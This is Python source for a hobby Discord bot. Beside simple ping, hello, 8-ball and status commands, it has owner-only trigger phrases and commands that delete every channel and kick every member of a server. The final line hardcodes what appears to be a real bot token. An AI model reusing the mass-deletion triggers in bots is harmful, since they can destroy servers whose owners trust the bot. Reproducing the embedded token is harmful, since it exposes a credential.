import discord
import random
import os
from discord.ext import commands, tasks
from itertools import cycle


client = commands.Bot(command_prefix = "$", intents = discord.Intents.all()) #set the intent and set the prefix to $
 
@client.event
async def on_ready():
    print("Connection successful: Bot is connected to discord.")

@client.event #client event: only triggers if the trigger words are said
async def on_message(message):
    if message.author == client.user:
        return
    
    if message.author.id == int("Your discord ID"): #since these are commands to kick everyone and destroy the server, only someone with the matching discord ID (usually me) can use this

        if "Destroy this place" in message.content:
                for channel in message.guild.channels:
                        await channel.delete()
        
        if "Get rid of everyone" in message.content:
            for discord_user in message.guild.members: #kick all members
                    try:
                        await discord_user.kick()
                    except discord.Forbidden:
                        print(f"Couldn't kick {discord_user.display_name}")   
    
    
    await client.process_commands(message)

@client.command() 
async def ping(ctx):
    bot_latency = round(client.latency * 1000)
    await ctx.author.send(f"Pong! {bot_latency} ms.") #the .author extension sends to dms. ctx.send represents object to send messages in the channel which 
    #triggered said message
    #remember the "f" has to be outside the quotes for direct reference to work.

@client.command() #test command, send backs hello
async def hello(ctx):
    await ctx.send("Hello!")

@client.command()
async def destroychannel(ctx, channel: discord.TextChannel): #delete specified channel, command that only user with matching id can use
    if ctx.author.id == int("Your discord ID"):
        await ctx.send("Destroying channel.")
        await channel.delete()

@client.command()
async def destroy(ctx):
    if ctx.author.id == int("Your discord ID"): #delete all channels, command that only the user with matching discord ID can use
        for channel in ctx.guild.channels:
            await channel.delete()
    else: 
         await ctx.send("Nah")

@client.command(aliases=["8ball", "eightball","eight ball", "8 ball"])
async def magic_eightball(ctx, *, question):
    with open("bot_2/8ballresponses.txt","r") as f: #opening this file and calling it f
        random_responses = f.readlines() #definining a variable called random_responses and setting it equal to f.readlines()
        # essentially treats the referenced file as a list in python
        response = random.choice(random_responses) #setting response equal to a random choice from the list

    await ctx.send(response)
  
@client.command(aliases=["setstatus", "set status"]) #to change the bot's status, command that only matching discord ID can use.
async def set_status(ctx, *, new_status: str):
    if ctx.author.id == int("your discord ID"):
        await client.change_presence(activity=discord.Game(new_status))
        await ctx.send(f"Bot status has been changed to {new_status}")
    else:
        await ctx.send("You do not have permission to change the bot's status.")


client.run("MTE1NzAxODUxMjE5NjM3ODY5NQ.GyvkaM.CNcqUewYXsDLnpXoWLBMHFaXpzNSZYLgSl7O_g")

